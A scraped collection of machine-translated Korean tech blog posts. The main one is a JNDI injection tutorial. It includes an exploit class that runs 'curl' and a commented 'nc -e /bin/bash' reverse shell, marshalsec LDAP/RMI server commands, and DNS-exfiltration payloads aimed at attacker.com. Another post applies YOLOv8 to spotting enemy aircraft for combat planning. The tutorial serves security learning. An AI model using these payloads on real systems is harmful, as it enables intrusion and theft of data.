이해하기 어려웠던 적이 있나요? 그럴 때 왜 그랬는지 궁금했던 적이 있나요? 두 가지 질문에 대한 답이 있습니다.\n\n지난 몇 년 동안, 저는 TypeScript 프로젝트의 코드 복잡성을 줄이는 데 상당한 시간을 보냈습니다. 널리 알려진 주장과는 달리, TypeScript 기능을 무분별하게 사용하는 것은 특히 경험이 부족한 엔지니어들이 시도할 때 코드베이스를 복잡하게 만들 수 있습니다. 타입을 줄이는 아이디어를 보여드리고 싶습니다...","ogImage":{"url":"/assets/img/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps_0.png"},"coverImage":"/assets/img/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps_0.png","tag":["Tech"],"readingTime":1},{"title":"JNDI Injection - 전체 이야기","description":"","date":"2024-05-15 10:05","slug":"2024-05-15-JNDIInjectionTheCompleteStory","content":"\n\n이 블로그는 JNDI Injection의 보안 문제를 조사합니다. JNDI Injection은 악의적인 사용자가 JNDI lookups를 조작하여 미인가된 코드를 실행할 수 있는 취약점입니다.\n\n소개\n\nJava Naming and Directory Interface (JNDI)는 네이밍 및 디렉터리 서비스와 상호 작용을 용이하게 해주는 Java API입니다.\n\n이를 통해 Java 애플리케이션이 위치가 아닌 이름을 통해 데이터와 리소스를 발견하고 검색할 수 있습니다.\n\n\n\n이러한 객체들은 원격 메서드 호출(Remote Method Invocation, RMI), 공통 객체 요청 브로커 아키텍처(Common Object Request Broker Architecture, CORBA), 경량 디렉터리 액세스 프로토콜(Lightweight Directory Access Protocol, LDAP), 또는 도메인 이름 서비스(Domain Name Service, DNS)와 같은 다양한 네이밍 또는 디렉토리 서비스에 저장될 수 있습니다.\n\n아키텍처\n\n- JNDI 아키텍처는 API와 서비스 제공자 인터페이스(SPI)로 구성됩니다.\n- SPI를 통해 다양한 네이밍 및 디렉토리 서비스가 투명하게 연결되어 Java 애플리케이션이 JNDI API를 사용하여 그들의 서비스에 접근할 수 있도록 합니다.\n- 더 알아보기: https://docs.oracle.com/javase/tutorial/jndi/overview/index.html\n\n![이미지](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png)\n\n\n\nJNDI의 주요 기능\n\n1. 객체 바인딩\n\n- JNDI는 자바 객체를 네이밍/디렉터리 서비스의 이름에 바인딩하는 것을 가능하게 합니다.\n\n2. 검색 및 쿼리\n\n\n\n- 응용 프로그램은 이름이나 속성을 기반으로 객체를 조회하거나 쿼리하는 데 JNDI를 사용할 수 있습니다. 이를 통해 런타임에 리소스나 서비스를 동적으로 검색할 수 있습니다.\n\n3. SPI를 통한 확장성\n\n- JNDI는 Service Provider Interfaces (SPIs)를 통해 다양한 디렉터리 서비스를 지원합니다. 이 SPI들은 JNDI를 다양한 네이밍 및 디렉토리 시스템과 통합할 수 있도록 합니다.\n\n네이밍 및 디렉토리 서비스 이해\n\n\n\n1. 네이밍 서비스\n\n- 네이밍 서비스는 이름과 객체를 관련시키고 ‘lookup’ 작업을 사용하여 이름에 따라 객체를 찾는 기능을 제공합니다.\n\n```java\nContext ctx = new InitialContext(env);\nMyObject obj = (MyObject) ctx.lookup(\"myObject\");\n```\n\n2. 디렉터리 서비스\n\n\n\n- 이름 대신 속성을 기반으로 디렉터리 객체를 저장하고 검색할 수 있는 특별한 유형의 네이밍 서비스입니다.\n\n```javascript\nDirContext ctx = new InitialDirContext(env);\nNamingEnumeration\u003c?\u003e namingEnum = ctx.search(\"ou=people\", \"(cn=Sickurity Wizard)\");\n```\n\n취약점\n\n아래는 기본적인 JNDI 클라이언트 애플리케이션입니다:\n\n\n\n```java\npublic class SimpleJndiLookup {   \n    public static void main(String[] args) {\n        Hashtable\u003cString, String\u003e env = new Hashtable\u003c\u003e();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL,\"rmi://localhost:9999\");\n        try {\n            Context ctx = new InitialContext(env);\n            Object obj = ctx.lookup(\"object\");\n            System.out.println(obj);\n            ctx.close();\n        } catch (NamingException e) {\n            System.err.println(\"Problem encountered during lookup: \" + e);\n        }\n    }\n}\n```\n\n공격자가 개체의 이름을 제어할 수 있다면, 그들은 RMI/LDAP/CORBA 서버로 리디렉션하여 임의의 개체를 반환할 수 있습니다. 이 개체가 JNDI 네이밍 참조의 인스턴스인 경우, JNDI 클라이언트는 이에 연결된 \"classFactory\" 및 \"classFactoryLocation\" 속성을 해결하기를 시도합니다. 만약 \"classFactory\" 값이 대상 Java 애플리케이션에 알려지지 않은 경우, Java는 지정된 \"classFactoryLocation\" 위치에서 공장의 바이트코드를 Java의 URLClassLoader를 사용하여 검색합니다. 원격 또는 로컬로 참조 공장을로드 할 때, 포함된 RCE 페이로드가 실행됩니다.\n\n참고\n\n# JNDI 공격\n\n\n\n\nJNDI 공격은 LDAP, RMI, CORBA 및 DNS와 같은 다양한 SPI를 사용하여 수행될 수 있습니다.\n\n**공격 흐름**\n\n- 대상 응용 프로그램 내에서 InitialContext.lookup(URI)가 호출됩니다. 여기서 URI는 사용자가 제어합니다.\n- 공격자는 URI 매개변수를 조작하여 악의적인 RMI 서비스를 가리키도록 하며, 이를 위해 rmi://hacker.rmi/exploit과 같은 URL을 사용합니다.\n- 공격자의 RMI 서버는 Reference 객체를 반환합니다. 이 Reference 객체에는 특별히 제작된 Factory 클래스가 포함되어 있습니다.\n- 대상 응용 프로그램은 Factory 클래스를 동적으로 로드하고 인스턴스화하며, 그런 다음 factory.getObjectInstance()를 호출하여 외부 원격 객체 인스턴스를 얻습니다.\n- 이 Factory 클래스의 인스턴스화는 악성 코드의 실행을 유발합니다. 이 코드는 Factory 클래스의 생성자, 정적 블록 또는 getObjectInstance() 메서드 내부에 작성되며 원격 코드 실행 (RCE)을 달성하기 위해 사용될 수 있습니다.\n\n이 기술은 오라클이 RMI에 코드베이스 제한을 추가하기 이전인 Java 8u121까지 잘 작동했습니다.\n\n\n\n위험을 방지하기 위해 가한 변경 사항은 다음과 같습니다:\n\n-\tRMI\n    -\tcom.sun.jndi.ldap.object.trustURLCodebase\n    -\tJDK 6u132, 7u122, 8u113 이후부터 이 속성은 기본값으로 false를 가집니다.\n    -\tJNDI를 통해 가져온 RMI 객체가 원격으로 제공된 코드베이스 URL에서 자동으로 클래스 정의를 로드하는 것을 방지합니다.\n    -\t여기서 SecurityManager는 더 이상 로드할 수 있는 것을 제한합니다.\n\n\n\n\n![Image 1](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_1.png)\n\n2. LDAP\n\n- com.sun.jndi.ldap.object.trustURLCodebase\n- This property has a default value of false starting from JDK 6u211, 7u201, 11.0.1, 8u191, and later versions.\n- Disables the automatic loading of Java class definitions from remote locations for objects retrieved via LDAP services in JNDI.\n\n![Image 2](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_2.png)\n\n\n\n\n3. Corba\n\n- com.sun.jndi.cosnaming.object.trustURLCodebase\n- JNDI를 통해 검색된 객체에서 원격 위치로부터 자바 클래스 정의를 자동으로로드하는 것을 비활성화합니다.\n\n![image](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_3.png)\n\n오래된 JDK 버전에서 JNDI를 악용하기\n\n\n\n- 귀하의 악의적인 코드가 포함된 Exploit.java 파일을 만듭니다.\n\n```js\npublic class Exploit {\n    static {\n        try {\n          java.lang.Runtime.getRuntime().exec⠀(\"curl burp.com\");\n          // java.lang.Runtime.getRuntime().exec⠀(\"nc -e /bin/bash IP 4444\");\n        } catch (Exception e) {\n            e.printStackTrace();\n}}\n```\n\n2. 코드를 컴파일합니다.\n\njavac Exploit.java -source 8 -target 8\n\n\n\n3. Exploit.class를 Http 서버에 호스팅하세요.\n\n```bash\npython3 -m http.server 8081\n```\n\n4. LDAP/RMI 서버를 실행하세요. 이곳에서는 marshalsec을 사용하여 서버를 시작합니다.\n\n```java\n#LDAP\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://PythonServerServingRemoteClass:8081/#Exploit\"\n```\n\n\n\n```js\n#RMI\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer  \"http://PythonServerServingRemoteClass:8081/#Exploit\"\n```\n\n5. Execute Payload\n\n- LDAP : ldap://LDAPServerIP:1389/Exploit\n- RMI : rmi://RMIServerIP:1099/Exploit\n\n## Exploiting JNDI in Newer JDK Versions\n\n\n\n\n새로운 JDK 버전에서 JNDI 취약점을 완화하기 위해 시행된 제한 사항에도 불구하고, 여전히 공격자가 그들을 악용할 수 있는 시나리오를 설명하는 몇 가지 상황을 소개합니다.\n\n1. trustURLCodebase가 True로 설정된 경우\n\n- com.sun.jndi.ldap.object.trustURLCodebase가 명시적으로 True로 설정된 경우, 이는 그 제한을 해제하고 기본 악용을 사용하여 악용될 수 있습니다.\n\n```js\nSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); //LDAP\n```\n\n\n\n2. DNS 메시지 조회를 통한 남용\n\n- 최신 Java 버전에서는 JNDI 원격 클래스 로딩이 금지되었지만, 메시지 조회 메커니즘 자체는 여전히 작동합니다.\n- 탐지 - `$'jndi:dns://attacker.com/gg`\n- DNS 데이터 유출→ `$'jndi:ldap://$'BELOWPAYLOADHERE'.attacker.com/gg`\n- 예시 Payloads\n  - main:argumentName → 명령행 인수의 값 유출\n  - sys:propname ⠀⠀⠀ → 시스템 속성 값 유출(예: user.name)\n\n3. 로컬 클래스 경로에서의 공격성 팩토리 클래스 남용\n\n- 더 높은 버전에서는 악의적 Factory가 원격으로 로드되지는 않지만, 공격자는 여전히 제공된 JNDI Reference를 통해 Factory 클래스와 해당 속성을 지정할 수 있습니다.\n- 공격자는 취약한 프로그램의 클래스 경로에 있는 어떤 Factory 클래스든 가젯으로 재사용할 수 있습니다.\n- 사용 가능한 Factory 클래스는 다음과 같은 속성을 가질 것입니다:\n\n\n\n\n1) 취약한 프로그램의 클래스 경로에 존재해야 합니다.\n2) ObjectFactory 인터페이스를 구현해야 합니다.\n3) getObjectInstance 메서드를 구현해야 합니다.\n4) Reference의 속성을 사용하여 위험한 작업을 수행해야 합니다.\n\n예시 가젯 클래스\n\n- BeanFactory\n\n- 여기서는 Reference의 문자열 속성에만 의존하여 임의의 Java 코드 객체가 생성됩니다(Reflection을 사용).\n- 이와 관련하여 org.apache.naming.factory.BeanFactory를 로컬 공장 클래스로 사용하고, javax.el.ELProcessor 클래스를 대상 클래스로 사용하고, EL 표현식을 사용하여 명령을 실행할 수 있습니다.\n- org.apache.naming.factory.BeanFactory 클래스(Tomcat과 함께 제공됨)가 클래스 경로에 있는 경우, 기본 JRE/JDK 버전과 관계없이 RCE를 달성할 수 있습니다.\n- 이에 대한 자세한 내용은 다음 블로그에서 확인할 수 있습니다: https://www.cnblogs.com/Welk1n/p/11066397.html\n- 그러나 이는 아래 Tomcat 버전에서 수정되었습니다.\n\n\n\n\n\n8.5.x는 8.5.79 버전 이후에 사용 가능합니다.\n9.0.x는 9.0.63 버전 이후에 사용 가능합니다.\n10.0.x는 10.0.21 버전 이후에 사용 가능합니다.\n10.1.x는 10.1.0-M14 버전 이후에 사용 가능합니다.\n\n보안 연구원들에 의해 발견된 여러 다른 가젯들이 있습니다.\n\n이 블로그를 작성하는 동안, 취약점을 실험하기 위해 여러 개의 랩을 만들었습니다. 다음은 시도해 볼 수 있는 저장소 링크입니다: Jndi-Injection-Labs\n\n다음 파트에서는 LDAP 독려가 JNDI 취약점 악용에 어떻게 사용될 수 있는지 살펴볼 것입니다.\n\n\n\n\n트위터에서 제 소식을 확인해보세요: [https://twitter.com/sickuritywizard](https://twitter.com/sickuritywizard)\n\n해킹 즐기기...\n\n참고 자료\n\n- [A Journey From JNDI/LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)\n- [JNDI RCE 취약점 분석](https://www.cnblogs.com/Welk1n/p/11066397.html)\n- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)","ogImage":{"url":"/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png"},"coverImage":"/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png","tag":["Tech"],"readingTime":8},{"title":"자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기","description":"","date":"2024-05-15 04:57","slug":"2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations","content":"\n\n적군 항공기를 계산하기 위해 YOLOv8 Object Detection과 정찰 드론에서 촬영한 항공 영상을 활용하여 군사 작전을 계획하기 위해서 지리공간 정보를 활용하세요.\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png)\n\n몇몇 분들께서는 이전에 작성한 제 글 중 하나인 \"마음대로 쓰는 이용사나 ‘머신’에 대해 읽으셨을 것입니다. 그 글에서는 '머신'이라고 하는 세계 감시 복합체의 다양한 구성 요소를 소개했습니다. 이 인프라는 전 세계에 배치된 다양한 수단을 포함하여 정부가 개인, 사회 행동 및 심지어 전 세계의 군사 시설을 모니터링할 수 있게 해주는 종합 감시를 가능하게합니다. 지리공간 정보(GEOINT)는 이러한 노력에서 중요한 역할을 합니다.\n\n이 글에서는 적대적 군사 비행기 기지를 추적하는 도구로서의 지리공간 정보(GEOINT)에 대해 다뤄보겠습니다. 이러한 위치와 그들의 비행기를 효과적으로 모니터링함으로써 그들에 대한 전투 작전 계획을 철저히 준비할 수 있습니다.\n\n\n\n## YOLOv8 Object Detection\n\nYOLOv8는 Ultralytics에서 개발한 유명한 실시간 객체 검출 시스템으로, 광범위한 응용 분야에서 널리 사용되고 있습니다. 군사 감시 및 정찰을 포함한 다양한 분야에서 사용되며, 이미지나 비디오 프레임 내의 객체를 실시간으로 감지하기 위해 설계되었습니다. 차량, 인원 또는 장비와 같은 객체들을 신속하고 정확하게 특정하여 상황 인식 및 대상 추적에 중요한 역할을 합니다.\n\n딥러닝과 합성곱 신경망(CNN)과 함께 PyTorch를 활용함으로써, YOLOv8은 한 장면 내에서 여러 객체를 동시에 감지하는 능력을 보여주며 높은 속도와 정확도를 달성합니다. 이것이 바로 저희 미션에서 사용하기로 결정한 이유입니다.\n\n## Prerequisites\n\n\n\n우선, 코드 실행을 위해 Google Compute Engine 백엔드에 Python 3을 사용하기로 결정했고, Google Colab을 사용할 것입니다. 따라서 우리는 먼저 의존성을 설치해야 합니다.\n\n```js\n!pip install ultralytics\n```\n\n이 설치 중에는 opencv-python, torch, pandas 및 이 패키지에서 사용해야 하는 기타 필수 의존성들이 설치됩니다.\n\n```js\nimport cv2\nimport urllib.request\n\nfrom ultralytics import YOLO, checks, hub\nfrom google.colab.patches import cv2_imshow\n```\n\n\n\n위 목록에서 볼 수 있듯이, 실험 중에 사용될 모든 필요한 라이브러리를 가져옵니다. 울트랠라틱스 모듈 외에도 Google Colab에서 올바르게 작동하는 cv2의 핫픽스인 cv2_imshow도 포함됩니다. urllib.request는 공개 저장소에서 이미지 예제를 다운로드하는 데 사용됩니다.\n\n## YOLOv8 모델\n\n객체 감지를 위해 설계된 딥 러닝 모델 YOLOv8는 입력 이미지를 그리드로 분할하여 작동합니다. 그런 다음 각 그리드 셀 내의 객체에 대한 바운딩 박스와 클래스 확률을 예측합니다. 이 모델의 효율성은 신경망을 통한 전체 이미지의 단일 피드포워드 패스를 처리할 수 있는 능력에서 나옵니다.\n\n일반적으로 모델을 만들려면 각 이미지에 대한 이미지와 레이블을 추가하여 데이터 세트를 올바르게 준비해야 합니다. 그러나 초기 단계 프로젝트에 필요한 대부분의 데이터 세트를 포함하는 데이터베이스가 이미 존재합니다. 오늘은 이를 실험에 활용할 것입니다. Roboflow 웹사이트로 이동해봅시다.\n\n\n\n![DIY for a Spy: Utilizing YOLOv8 Object Detection in Military Operations - Image 1](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_1.png)\n\n위의 그림에서 보는 것처럼 프로젝트를 위한 적합한 DataSet를 찾아야 합니다. 이 예시에서는 모델 유형으로 yolov8를 선택했고, 프로젝트 유형으로 객체 감지를 선택하고, 검색어로 공중을 입력했습니다. 시스템은 다양한 데이터 세트 목록을 제공하며, 이미지 수가 1192개이고 클래스가 1개인 것을 고려하여 우리의 요구에 더 잘 맞는 하나를 선택했습니다.\n\n![DIY for a Spy: Utilizing YOLOv8 Object Detection in Military Operations - Image 2](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_2.png)\n\n데이터 세트가 미션에 적합하다고 판단했다면, 적절한 내보내기 형식을 선택하여 다운로드해야 합니다. 우리의 시나리오에서는 이미 사용하기로 한 YOLOv8 형식을 선택했습니다.\n\n\n\n\n아래의 표를 Markdown 형식으로 변경하세요.\n\n\n\n위의 그림에서 볼 수 있듯이, 저는 프로젝트 이름 AER_AIR_04s, 항공 기지에서 항공기 감지하는 짧은 설명, 심지어 샘플 이미지까지 입력했습니다. 다른 프로젝트들 중에서도 이 프로젝트를 쉽게 식별할 수 있도록 도와주죠. \n\n다음 단계로 진행할 때는 '데이터 세트'로 이동하셔서 다음과 같이 Detect 데이터 세트 유형, 데이터 세트 이름, 그리고 설명을 선택해야 합니다.\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_5.png)\n\n\n\n'Create' 버튼을 클릭한 후 파일 업로드가 완료되면 데이터 세트 목록 중에 새로운 데이터 세트가 표시됩니다.\n\n![image1](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_6.png)\n\n그냥 들어가서 이미지와 라벨을 확인하고 '모델 훈련' 버튼을 눌러 YOLOv8 모델 훈련을 계속하세요.\n\n![image2](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_7.png)\n\n\n\n다음 창에서는 목록에서 프로젝트를 선택하고, 예제에서 나온 모델명 YOLOv8sAir을 입력하고, 속도 최적화된 YOLOv8 아키텍처 YOLOv8를 선택한 후 '계속' 버튼을 클릭해야 합니다.\n\n![이미지](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_8.png)\n\nUltralytics Hub에는 모델을 훈련하는 데 사용할 수 있는 다양한 옵션이 있지만, 우리는 다음을 활용할 것입니다 - 'Google Colab'.\n\n![이미지](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_9.png)\n\n\n\n위의 그림과 같이 모델 훈련을 위한 인증 키와 URL(https://hub.ultralytics.com/models/BN8V8tA1pOt6thjZKq6V)이 제공됩니다.\n\n그냥 전체 코드를 복사해서 Google Colab에 붙여넣기하세요.\n\n```js\nhub.login('[YOUR_AUTH_KEY]')\n\nmodel = YOLO('https://hub.ultralytics.com/models/BN8V8tA1pOt6thjZKq6V')\nresults = model.train()\n```\n\n그런 다음 '런타임' 메뉴로 이동하여 '런타임 유형 변경'을 선택하고 'T4 GPU'를 선택하여 NVIDIA T4 GPU 가속기로 훈련을 가속화하세요.\n\n\n\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_10.png)\n\n\n번역:\n이미지 태그를 Markdown 형식으로 변경해주세요.\n\n작업이 완료되었으면, Google Colab 스크립트에서 일반적으로 하는 것처럼 YOLOv8 모델 훈련 프로세스를 시작할 수 있습니다.\n\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_11.png)\n\n\n해당 큰 데이터 세트에 대한 훈련 프로세스는 대략 3-4시간이 소요될 것입니다. 그러나 진행 상황은 Google Colab 목록에서만 확인하는 것이 적합하지 않을 수 있기 때문에 YOLOv8 모델 웹페이지의 특별 진행률 표시줄을 사용하여 모니터링할 수 있습니다.\n\n\n\n\u003cimg src=\"/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_12.png\" /\u003e\n\n이미 이전에 말씀드렸듯이, 시간이 걸릴 수 있습니다. 완료되면 '배포' 탭으로 이동하여 최종 모델 (*.pt) 파일을 다운로드하세요. 이 모델을 활용하여 라즈베리 파이를 비롯한 모든 기기에서 YOLOv8 패키지를 사용하여 물체를 감지할 수 있습니다. 공군기지나 전술에서 또는 요청된 작전을 위해 정찰 드론에서 공중 또는 지면의 물체를 인지할 수 있습니다.\n\n## YOLOv8 사용법\n\n이 시점에서 이미 원하는 PyTorch (*.pt) 파일과 YOLOv8 모델의 가중치를 갖고 있는 상태입니다. 이 파일은 예시에서 21.4MB 크기입니다. 몇 줄의 코드만 추가하면 어떤 애플리케이션에서도 사용할 수 있게 됩니다.\n\n\n\n편의를 위해 PT 파일과 실험 중에 사용할 이미지 및 비디오 소스를 지속적인 블록체인 저장소 Arweave에 업로드했습니다. 이 세 개의 파일을 다운로드하여 Google Compute Engine의 작업 디렉토리에 저장하려면 다음 코드를 작성하고 실행해야 합니다.\n\n```js\nyolov8sair_url = 'https://6bq43uyscbhniu4kvl6hayy3zosqjnl5x2v2jm7zlfse6nnqrqsa.arweave.net/8GHN0xIQTtRTiqr8cGMby6UEtX2-q6Sz-VlkTzWwjCQ'\nurllib.request.urlretrieve(yolov8sair_url, 'yolov8sair.pt')\n\nsource_file = 'https://6x77tjsjpqn6ze2k7izx36xgtipzff6yi2jfnp2xxf6lvmtyy7oa.arweave.net/9f_5pkl8G-yTSvozffrmmh-Sl9hGkla_V7l8urJ4x9w'\nurllib.request.urlretrieve(source_file, 'Aerial_AirBase.jpg')\n\nsource_video = 'https://3tghzdwlhmyajv5eadufzesdo7epc5queknepym6hv2p737mgvxa.arweave.net/3Mx8jss7MATXpADoXJJDd8jxdhQimkfhnj10_-_sNW4'\nurllib.request.urlretrieve(source_video, 'airport_video_source.mp4')\n```\n\n세 개의 파일이 있음을 알아차릴 수 있을 것입니다: yolov8sair.pt는 모델 가중치 파일, Aerial_AirBase.jpg는 정찰 드론에서 가져온 예제 이미지로 객체 감지에 사용될 것이며, airport_video_source.mp4는 추후 객체 인식을 위해 사용할 비디오 소스의 예제입니다.\n\n```js\nmodel = YOLO('yolov8sair.pt')\n\nresults = model.predict('Aerial_AirBase.jpg')\nannotated_frame = results[0].plot()\ncv2_imshow(annotated_frame)\n```\n\n\n\n위에 표시된 이미지에서, 다양한 확률로 각각 약 84% 정도의 신뢰 수준을 나타내며, 세 대의 비행기가 감지되었습니다. 이와 같은 상황에서는 결과[] 배열의 객체 목록을 자동으로 계산하여 손쉽게 수를 세어볼 수 있습니다.\n\n신뢰도와 확률 수준은 날씨 조건에 따라 다를 수 있습니다. 그러나 구리게 날씨 같은 명시적 단점에도 불구하고, 이 정찰 방법은 군사 작전을 계획하고 전투 활동을 지원하는 데 중요하다는 것이 증명되었습니다.\n\n\n\n방금 보신 것처럼 몇 줄의 코드만으로 사용하기 쉬운 것이 이 기술의 장점입니다. 이를 활용하여 소형 비행 컨트롤러를 갖춘 자율 비행 드론을 포함한 다양한 애플리케이션에 적용할 수 있습니다.\n\n이 객체 감지 메커니즘을 통합하여 만들 수 있는 스마트 애플리케이션을 상상해보세요. 비행 경로를 추적하고 목표물을 감지하여 파괴하는 자동 비행기와 같은 전투 드론을 생각해보세요. 상상력을 발휘해 보세요.\n\n군사 솔루션에 활용할 수 있는 또 다른 좋은 예시인데요:\n\n```js\nmodel = YOLO('yolov8sair.pt')\n\n# 비디오 스트림 내 객체 감지\ncap = cv2.VideoCapture(f\"airport_video_source.mp4\")\nimg_array = []\n\nwhile cap.isOpened():\n    success, frame = cap.read()\n\n    if success:\n        results = model(frame)\n        annotated_frame = results[0].plot()\n        img_array.append(annotated_frame)\n    else:\n        break\n\ncap.release()\n\n# 출력 비디오 파일로 저장\nsize = img_array[0].shape[1], img_array[0].shape[0]  # (384, 640)\nwriter = cv2.VideoWriter(f\"airport_video_output.mp4\", cv2.VideoWriter_fourcc(*\"mp4v\"), 25, size)\nfor frame in img_array:\n    img_n = cv2.resize(frame, size)\n    writer.write(img_n)\nwriter.release()\n```\n\n\n\n이 문제는 비디오 스트림에서 Object Detection이 포함되어 있으며, 여기서는 airport_video_source.mp4 파일에서 추출됩니다. 그런 다음 비디오를 프레임으로 나누어 각 프레임에서 항공기를 감지하고 이를 airport_video_output.mp4 파일로 편집합니다.\n\nGoogle Compute Engine의 작업 디렉토리에서이 파일을 다운로드 할 수 있습니다. 이미 이에 익숙한 것으로 알고 있습니다.\n\n![이미지](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_14.png)\n\n위의 비디오 파일을 확인해보세요. 비행기 대부분이 감지되었지만 일부는 인식되지 않았습니다. 모델의 정확도를 향상시킬 방법에 대해 고려하고, 의견을 공유하려면 아래의 댓글란을 이용해 주세요.\n\n\n\n## X-Files\n\n이 기사에서 시연 목적으로 사용한 YOLOv8 Object Detection의 모든 파일 목록은 아래에 나와 있습니다.\n\nPyTorch 모델: YOLOv8sAir\n\n드론 소스:\n\n\n\n- 정적 이미지: Aerial_AirBase.jpg\n- 공항 동영상: AirBase_Video.mp4\n\n소스 코드: 구글 연구 Colab\n\n당신의 상상력을 발휘하여 놀라운 솔루션을 만들어보세요!\n\n## 연락처\n\n\n\n이 기사에서 설명된 내용 또는 다른 아이디어에 대해 궁금한 점이 있으면 — 트위터에서 언제든지 저에게 질문해주세요.\n\n트위터: https://twitter.com/dmytro_sazonov\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_15.png)","ogImage":{"url":"/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png"},"coverImage":"/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png","tag":["Tech"],"readingTime":8},{"title":"아두이노와 iOS 간의 블루투스 연결","description":"","date":"2024-05-15 04:34","slug":"2024-05-15-BluetoothconnectionbetweenArduinoandiOS","content":"\n\n# 소개\n\n안녕하세요!! 여기에 오신 것을 환영합니다. 아두이노 장치에서 iOS 장치로 블루투스를 사용하여 데이터를 송수신하는 방법을 찾고 계시다고 생각합니다, 맞나요? (빌드할 내용을 설명하는 비디오가 있는 GitHub 링크를 여기에 배치했습니다).\n\n이를 위해 지식을 두 부분으로 나누기로 결정했습니다. 첫 번째 부분에서는 하드웨어 구체적인 내용, 블루투스 모듈의 조립 및 아두이노 코드를 통해 정보를 전송하는 방법에 대해 다룰 것입니다. 이 문서의 후반부에서는 iOS 개발에 대해 다룰 예정입니다.\n\n# 블루투스 모듈\n\n\n\n이 프로젝트에서는 에너지 소비가 적은 통신 형태인 블루투스를 아두이노와 IOS 장치 간에 사용하기로 결정했습니다. 이것은 배터리로 아두이노를 사용할 때 중요한 요소입니다.\n이를 염두에 두고 프로젝트를 시작할 때의 첫 번째 질문은 아두이노에 이미 블루투스가 내장되어 있는지 여부입니다(이를 위해 문서에 접근할 수 있음). 저의 경우, 블루투스가 내장되어 있지 않은 ArduinoUno를 사용할 예정이므로 이 기술을 제공하는 모듈이 필요합니다.\n\n어떤 모듈을 사용해야 할까요?\niOS 기기는 BLE(Bluetooth Low Energy)라는 기술을 사용하여 통신하며, 일반적인 블루투스와 차이가 있지만, 이는 다른 기사로 남기겠습니다. 따라서 BLE를 지원하는 모듈이 필요하며, 여러 옵션이 있습니다(구매하기 전에 주의하세요), 하지만 저는 HC-08 모듈을 사용할 예정입니다.\n\n![Image](/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_0.png)\n\n# Arduino에 HC-08 연결하기\n\n\n\n조립을 더 잘 설명하기 위해 어셈블리를 시연하기 위한 다이어그램을 만들었습니다.\n\n![Bluetooth Connection Diagram](/assets/img/2024-05-15-BluetoothconnectionbetweenArduinoandiOS_1.png)\n\n프로젝트에서 핀 2와 3을 이미 사용 중이라면, TX 및 RX를 사용 가능한 핀에 연결할 수 있습니다(이 경우 SoftwareSerial을 사용합니다). 그러나 코드에 도달하면 사용 중인 핀을 변경해야 합니다.\n이미지에 문제가 있을 경우, HC-08에서 아두이노로 연결되는 방법을 적어놓겠습니다:\n\n- VCC → 5V\n- GND → GND\n- TXD(송신) → 2\n- RXD(수신) → 3\n\n\n\n# 코딩 시간\n\n우리가 아두이노에 업로드할 코드는 블루투스 모듈(나의 iOS 기기에 연결될 것)로 정보를 보내고, 그 모듈은 나의 iOS 기기로 데이터를 전송할 것을 목적으로 합니다.\n\n```js\n#include \"SoftwareSerial.h\"\nSoftwareSerial bluetooth(3, 2); //3 = RX ; 2 = TX\n```\n\n기본적으로, 코드의 이 부분에서는 SoftwareSerial 라이브러리를 사용하고 있습니다. 이 라이브러리를 사용하면 아두이노 디지털 핀에 추가적인 시리얼 포트를 생성할 수 있습니다. 이 기능은 시리얼 통신이 필요하지만 이미 주 시리얼 포트를 코드를 디버깅하기 위한 시리얼 모니터로 사용하는 경우와 같이 주 시리얼 포트가 다른 목적으로 이미 사용 중인 경우 유용합니다.\n\n\n\n소프트웨어 시리얼 인스턴스가 이름이 \"bluetooth\"인 것을 만들었습니다. 매개변수 (3, 2)는 아두이노의 핀 3을 RX(수신)로, 핀 2를 TX(송신)로 사용할 것을 나타냅니다 (기본적으로 첫 번째 숫자가 RX이며 두 번째 숫자가 TX입니다).\n\n⚠️만약 다른 핀을 사용했다면, 숫자를 변경하세요.⚠️\n\n```js\nvoid setup() {\n  Serial.begin(9600);\n  bluetooth.begin(9600);\n}\n```\n\n설정 함수에서(스크립트가 실행될 